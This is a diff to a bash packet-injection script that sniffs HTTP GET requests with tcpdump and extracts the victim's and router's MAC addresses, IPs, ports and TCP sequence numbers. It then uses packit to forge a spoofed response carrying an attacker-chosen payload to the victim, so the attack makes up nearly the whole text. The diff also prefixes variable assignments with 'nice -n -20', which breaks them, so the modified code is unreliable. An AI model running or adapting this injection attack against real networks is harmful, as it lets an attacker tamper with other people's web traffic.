@@ -47,6 +47,8 @@
 
 ## The wireshark community for it's excellent String Matching Capture Filter Generator
 	# https://www.wireshark.org/tools/string-cf.html
+
+## xmnr for the idea to issue a nice of -20 throughout the script
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -75,28 +77,28 @@ monitor--()
 {
 	
 ## src MAC -- Victim
-vicmac=$(awk -v i0="$i0" '{print $i0}' LOG | cut -d: -f 2-)
+nice -n -20 vicmac=$(awk -v i0="$i0" '{print $i0}' LOG | cut -d: -f 2-)
 
 ## src MAC -- Router LAN MAC
-rtrmac=$(awk -v i1="$i1" '{print $i1}' LOG | cut -d: -f 2-)
+nice -n -20 rtrmac=$(awk -v i1="$i1" '{print $i1}' LOG | cut -d: -f 2-)
 
 ## src IP -- Victim
-vicip=$(awk -v i2="$i2" '{print $i2}' LOG | cut -d. -f -4)
+nice -n -20 vicip=$(awk -v i2="$i2" '{print $i2}' LOG | cut -d. -f -4)
 
 ## src port -- Victim
-vicport=$(awk -v i2="$i2" '{print $i2}' LOG | cut -d. -f 5-)
+nice -n -20 vicport=$(awk -v i2="$i2" '{print $i2}' LOG | cut -d. -f 5-)
 
 ## dst IP -- Server
-svrip=$(awk -v i3="$i3" '{print $i3}' LOG | cut -d. -f -4)
+nice -n -20 svrip=$(awk -v i3="$i3" '{print $i3}' LOG | cut -d. -f -4)
 
 ## svr port -- Server
-svrport=$(awk -v i3="$i3" '{print $i3}' LOG | cut -d. -f 5- | sed 's/://')
+nice -n -20 svrport=$(awk -v i3="$i3" '{print $i3}' LOG | cut -d. -f 5- | sed 's/://')
 
 ## sequence number + length
-acknum=$(awk -v i4="$i4" '{print $i4}' LOG | cut -d: -f2 | sed 's/,//')
+nice -n -20 acknum=$(awk -v i4="$i4" '{print $i4}' LOG | cut -d: -f2 | sed 's/,//')
 
 ## old acknowledgement number
-seqnum=$(awk -v i5="$i5" '{print $i5}' LOG | sed 's/,//')
+nice -n -20 seqnum=$(awk -v i5="$i5" '{print $i5}' LOG | sed 's/,//')
 }
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
@@ -137,11 +139,11 @@ i5=$(expr $index + 28)
 ## Prepare the hex inject string
 inject=$(echo "0x$(cat $1 | xxd -g1 -ps | fold -w2 | paste -sd ' ')")
 while true; do
-	tcpdump -i $2 -c 1 -eKnSt 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' 1>LOG &
-	inotifywait -r -e modify ./LOG
+	nice -n -20 tcpdump -i $2 -c 1 -eKnSt 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' 1>LOG &
+	nice -n -20 inotifywait -r -e modify ./LOG
 	monitor--
 	
 	## inject the packet
-	packit -i $3 -R -nnn -a $acknum -D $vicport -F PA -q $seqnum -S $svrport -d $vicip -s $svrip -X $rtrmac -Y $vicmac -p "$inject"
+	nice -n -20 packit -i $3 -R -nnn -a $acknum -D $vicport -F PA -q $seqnum -S $svrport -d $vicip -s $svrip -X $rtrmac -Y $vicmac -p "$inject"
 done
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
